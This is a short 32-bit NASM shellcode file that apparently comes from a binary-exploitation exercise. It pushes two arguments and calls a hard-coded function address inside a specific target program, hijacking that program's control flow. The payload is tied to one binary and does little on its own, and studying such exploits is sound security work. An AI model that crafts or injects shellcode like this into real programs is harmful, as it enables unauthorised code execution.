; shellcode.asm
BITS 32
section .text
global _start

_start:
    push 0x00000004
    push 0x00000000
    mov ebx,0x565561ad
    call ebx
